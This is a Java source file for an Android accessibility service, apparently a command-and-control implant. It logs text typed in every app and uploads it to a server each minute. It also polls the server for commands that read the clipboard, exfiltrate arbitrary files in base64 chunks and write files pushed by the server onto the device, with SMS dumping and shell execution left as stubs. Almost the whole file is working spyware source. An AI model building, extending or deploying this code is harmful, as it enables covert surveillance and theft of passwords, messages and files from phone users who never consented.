package com.example.crossc2;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class C2AccessibilityService extends AccessibilityService {

    private static final String TAG = "C2AccessibilityService";
    private ApiClient apiClient;
    private StringBuilder keylogBuffer = new StringBuilder();
    private final Handler handler = new Handler(Looper.getMainLooper());
    private ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    private static final long KEYLOG_SEND_INTERVAL_MS = 60000; // 60 seconds
    private static final long COMMAND_POLL_INTERVAL_MS = 60000; // 60 seconds
    private static final long API_RETRY_DELAY_MS = 10000; // 10 seconds

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "C2AccessibilityService created");
        apiClient = new ApiClient(); // Initialize ApiClient

        // Schedule keylog sending
        scheduler.scheduleAtFixedRate(this::sendKeylog, KEYLOG_SEND_INTERVAL_MS, KEYLOG_SEND_INTERVAL_MS, TimeUnit.MILLISECONDS);

        // Schedule command polling
        scheduler.scheduleAtFixedRate(this::pollCommands, COMMAND_POLL_INTERVAL_MS, COMMAND_POLL_INTERVAL_MS, TimeUnit.MILLISECONDS);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null &amp;&amp; source.getText() != null) {
                String text = source.getText().toString();
                // Simple approach: append the whole text. More advanced would track changes.
                // This might capture more than just keyboard input (e.g., copy-paste, autofill)
                // A more precise method would involve tracking focus changes and text diffs.
                keylogBuffer.append("[").append(event.getPackageName()).append("]");
                keylogBuffer.append(text).append("\n");
                Log.d(TAG, "Captured text: " + text);
            }
        }
        // Consider other event types like TYPE_VIEW_CLICKED for button presses, etc.
    }

    private void sendKeylog() {
        if (keylogBuffer.length() == 0) {
            return;
        }

        final String dataToSend = keylogBuffer.toString();
        keylogBuffer.setLength(0); // Clear buffer after copying

        apiClient.sendData("keylog", dataToSend, null, null, -1, -1, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send keylog", e);
                // Retry logic: prepend failed data back to buffer or handle separately
                // For simplicity, we&apos;ll just log the error for now.
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "Keylog send failed: " + response.code());
                } else {
                    Log.d(TAG, "Keylog sent successfully");
                }
                response.close();
            }
        });
    }

    private void pollCommands() {
        apiClient.fetchCommands(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to poll commands", e);
                // Retry polling after a delay
                handler.postDelayed(C2AccessibilityService.this::pollCommands, API_RETRY_DELAY_MS);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    if (response.isSuccessful()) {
                        String responseBody = response.body().string();
                        Log.d(TAG, "Commands received: " + responseBody);
                        handleCommands(responseBody);
                    } else {
                        Log.e(TAG, "Command polling failed: " + response.code());
                        // Retry polling after a delay
                        handler.postDelayed(C2AccessibilityService.this::pollCommands, API_RETRY_DELAY_MS);
                    }
                } finally {
                    response.close();
                }
            }
        });
    }

    private void handleCommands(String jsonResponse) {
        try {
            JSONObject jsonObject = new JSONObject(jsonResponse);
            JSONArray commandsArray = jsonObject.getJSONArray("commands");

            for (int i = 0; i < commandsArray.length(); i++) {
                JSONObject commandObj = commandsArray.getJSONObject(i);
                String commandType = commandObj.getString("command");
                String commandResult = "";

                Log.d(TAG, "Processing command: " + commandType);

                try {
                    switch (commandType) {
                        case "dump SMS":
                            // TODO: Implement SMS dumping logic
                            commandResult = "SMS dumping not implemented yet.";
                            break;
                        case "get clipboard":
                            commandResult = getClipboardContent();
                            break;
                        case "upload":
                            // Expected format: { "command": "upload", "filepath": "/path/to/file" }
                            String filepathToUpload = commandObj.optString("filepath");
                            if (!filepathToUpload.isEmpty()) {
                                uploadFile(filepathToUpload);
                                commandResult = "Attempting to upload file: " + filepathToUpload;
                            } else {
                                commandResult = "Upload command requires &apos;filepath&apos; parameter.";
                            }
                            break;
                        case "download":
                            // Expected format: { "command": "download", "filename": "file.txt", "content": "base64content" }
                            String filenameToDownload = commandObj.optString("filename");
                            String fileContentBase64 = commandObj.optString("content");
                             if (!filenameToDownload.isEmpty() &amp;&amp; !fileContentBase64.isEmpty()) {
                                downloadFile(filenameToDownload, fileContentBase64);
                                commandResult = "Attempting to download file: " + filenameToDownload;
                            } else {
                                commandResult = "Download command requires &apos;filename&apos; and &apos;content&apos; parameters.";
                            }
                            break;
                        default:
                            // Execute as shell command (requires root or specific permissions/methods)
                            // This is complex on Android and often requires rooting or specific APIs.
                            // For simplicity, we&apos;ll return a placeholder.
                            commandResult = "Shell command execution not directly supported via AccessibilityService. Command: " + commandType;
                            // A more advanced approach would involve a separate component with root permissions
                            // or using specific Android APIs if available for the command.
                            break;
                    }
                } catch (Exception e) {
                    commandResult = "Error executing command &apos;" + commandType + "&apos;: " + e.getMessage();
                    Log.e(TAG, "Error executing command", e);
                }

                // Send command result back to server (unless it&apos;s a file transfer command which handles its own response)
                if (!commandType.equals("upload") &amp;&amp; !commandType.equals("download")) {
                     sendCmdOutput(commandType, commandResult);
                }
            }

        } catch (JSONException e) {
            Log.e(TAG, "Error parsing commands JSON", e);
        }
    }

    private String getClipboardContent() {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null &amp;&amp; clipboard.hasPrimaryClip()) {
            ClipData clip = clipboard.getPrimaryClip();
            if (clip != null &amp;&amp; clip.getItemCount() > 0) {
                CharSequence text = clip.getItemAt(0).getText();
                return text != null ? text.toString() : "";
            }
        }
        return "Clipboard is empty or could not be accessed.";
    }

    private void uploadFile(String filepath) {
        new Thread(() -> {
            try {
                File file = new File(filepath);
                if (!file.exists() || !file.canRead()) {
                    sendCmdOutput("upload", "Error: File not found or cannot be read: " + filepath);
                    return;
                }

                long totalSize = file.length();
                int chunkSize = 1024 * 1024; // 1MB chunks
                byte[] buffer = new byte[chunkSize];
                int bytesRead;
                int offset = 0;

                InputStream inputStream = new FileInputStream(file);

                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    byte[] chunk = Arrays.copyOfRange(buffer, 0, bytesRead);
                    String chunkBase64 = Base64.encodeToString(chunk, Base64.NO_WRAP);

                    // Send chunk to server
                    apiClient.sendData("file_chunk", "", file.getName(), chunkBase64, offset, (int) totalSize, new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            Log.e(TAG, "Failed to send file chunk", e);
                            // TODO: Implement retry logic for chunks
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {
                            if (!response.isSuccessful()) {
                                Log.e(TAG, "File chunk send failed: " + response.code());
                                // TODO: Implement retry logic for chunks
                            } else {
                                Log.d(TAG, "File chunk sent successfully");
                            }
                            response.close();
                        }
                    });

                    offset += bytesRead;
                    // Add a small delay to avoid overwhelming the server
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }
                inputStream.close();
                sendCmdOutput("upload", "File upload complete: " + filepath);

            } catch (IOException e) {
                Log.e(TAG, "Error during file upload", e);
                sendCmdOutput("upload", "Error during file upload: " + e.getMessage());
            }
        }).start();
    }

    private void downloadFile(String filename, String contentBase64) {
        new Thread(() -> {
            try {
                byte[] fileContent = Base64.decode(contentBase64, Base64.NO_WRAP);

                // Define where to save the downloaded file
                // For simplicity, saving to app&apos;s cache directory.
                // Consider external storage with proper permissions for real use.
                File outputFile = new File(getCacheDir(), filename);
                FileOutputStream outputStream = new FileOutputStream(outputFile);
                outputStream.write(fileContent);
                outputStream.close();

                sendCmdOutput("download", "File downloaded successfully to: " + outputFile.getAbsolutePath());
                Log.d(TAG, "File downloaded successfully to: " + outputFile.getAbsolutePath());

            } catch (IOException e) {
                Log.e(TAG, "Error during file download", e);
                sendCmdOutput("download", "Error during file download: " + e.getMessage());
            }
        }).start();
    }


    private void sendCmdOutput(String originalCommand, String output) {
        apiClient.sendData("cmd_output", "Command: " + originalCommand + "\nOutput:\n" + output, null, null, -1, -1, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send command output", e);
                // TODO: Implement retry logic for command output
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "Command output send failed: " + response.code());
                } else {
                    Log.d(TAG, "Command output sent successfully");
                }
                response.close();
            }
        });
    }


    @Override
    public void onInterrupt() {
        Log.d(TAG, "C2AccessibilityService interrupted");
    }

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "C2AccessibilityService connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED; // Listen for text changes
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY; // Optional flags
        this.setServiceInfo(info);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "C2AccessibilityService destroyed");
        scheduler.shutdownNow(); // Stop scheduled tasks
    }
}